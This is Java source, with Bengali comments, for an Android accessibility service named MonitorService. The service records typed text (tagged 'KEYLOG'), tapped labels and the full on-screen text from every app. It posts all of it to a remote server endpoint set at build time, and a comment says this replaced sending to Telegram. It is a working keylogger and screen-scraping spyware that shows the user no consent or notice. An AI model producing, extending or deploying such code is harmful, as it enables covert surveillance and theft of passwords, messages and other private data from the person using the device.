package com.example.monitorapp;

import android.accessibilityservice.AccessibilityService;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.io.IOException;
import java.util.concurrent.TimeUnit;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MonitorService extends AccessibilityService {

    // আপনার Render এর লিংক বিল্ড টাইমে বসবে
    private static final String API_URL = BuildConfig.API_ENDPOINT; 

    private OkHttpClient httpClient = new OkHttpClient.Builder()
            .connectTimeout(15, TimeUnit.SECONDS)
            .readTimeout(15, TimeUnit.SECONDS)
            .build();

    private Handler handler = new Handler(Looper.getMainLooper());
    private String lastScreenTextHash = "";
    private long lastScreenSentTime = 0;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "Unknown";

        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                CharSequence typedText = event.getText() != null && event.getText().size() > 0 ? event.getText().get(0) : "";
                if (typedText != null && typedText.length() > 0) {
                    sendDataToServer("KEYLOG", "📝 [" + packageName + "] " + typedText);
                }
                break;

            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                AccessibilityNodeInfo source = event.getSource();
                String clickedText = "";
                if (source != null) {
                    clickedText = source.getText() != null ? source.getText().toString() : (source.getContentDescription() != null ? source.getContentDescription().toString() : "");
                    source.recycle();
                }
                if (!clickedText.isEmpty()) {
                    sendDataToServer("TAP", "👆 [" + packageName + "] Tapped: " + clickedText);
                }
                break;

            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                handler.postDelayed(() -> captureAndSendScreenText(packageName), 1000);
                break;

            case AccessibilityEvent.TYPE_VIEW_SCROLLED:
                handler.postDelayed(() -> captureAndSendScreenText(packageName), 500);
                break;

            case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                handler.postDelayed(() -> captureAndSendScreenText(packageName), 500);
                break;
        }
    }

    private void captureAndSendScreenText(String packageName) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;
        String fullText = extractTextFromNode(root);
        if (fullText.length() > 5) {
            String hash = Integer.toHexString(fullText.hashCode());
            long now = System.currentTimeMillis();
            if (!hash.equals(lastScreenTextHash) || (now - lastScreenSentTime) > 3000) {
                lastScreenTextHash = hash;
                lastScreenSentTime = now;
                sendDataToServer("SCREEN", "🖥️ [" + packageName + "] " + fullText);
            }
        }
    }

    private String extractTextFromNode(AccessibilityNodeInfo node) {
        StringBuilder sb = new StringBuilder();
        if (node == null) return sb.toString();
        if (node.getText() != null) sb.append(node.getText().toString()).append(" | ");
        if (node.getContentDescription() != null) sb.append(node.getContentDescription().toString()).append(" | ");
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                sb.append(extractTextFromNode(child));
                child.recycle();
            }
        }
        return sb.toString();
    }

    @Override
    public void onInterrupt() {}

    // ✅ এখানে টেলিগ্রামের বদলে আপনার Render সার্ভারে JSON পাঠানো হচ্ছে
    private void sendDataToServer(String type, String message) {
        new Thread(() -> {
            try {
                // JSON ফরম্যাটে ডাটা তৈরি
                String json = "{\"type\":\"" + type + "\",\"message\":\"" + message + "\",\"timestamp\":" + System.currentTimeMillis() + "}";
                
                RequestBody body = RequestBody.create(json, MediaType.parse("application/json; charset=utf-8"));
                
                Request request = new Request.Builder()
                        .url(API_URL)
                        .post(body)
                        .addHeader("Content-Type", "application/json")
                        .build();

                try (Response response = httpClient.newCall(request).execute()) {
                    // সার্ভার থেকে রেসপন্স চেক করা লাগলে এখানে করতে পারেন
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }).start();
    }
}